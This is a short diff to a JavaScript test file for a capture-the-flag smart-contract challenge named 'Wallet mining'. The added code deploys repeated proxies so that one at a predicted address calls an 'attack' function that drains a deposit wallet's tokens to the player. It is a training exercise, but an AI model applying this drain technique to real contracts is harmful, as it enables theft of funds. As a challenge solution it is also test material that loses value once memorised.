@@ -144,6 +144,21 @@ describe("[Challenge] Wallet mining", function () {
     MockWallet = await ethers.getContractFactory("MockWallet");
     mockWallet = await MockWallet.deploy();
     console.log("MockWallet deployed at", mockWallet.address);
+    //Deploy deposit wallet
+    let functionData = MockWallet.interface.encodeFunctionData("attack", [
+      token.address,
+      player.address,
+    ]);
+    for (let i = 1; i < 45; i++) {
+      if (i == 43) {
+        console.log("Draining funds from Deposit Wallet");
+        depositWallet = await DeployedFactory.createProxy(
+          mockWallet.address,
+          functionData
+        );
+      }
+      depositWallet = await DeployedFactory.createProxy(mockWallet.address, []);
+    }
   });
 
   after(async function () {
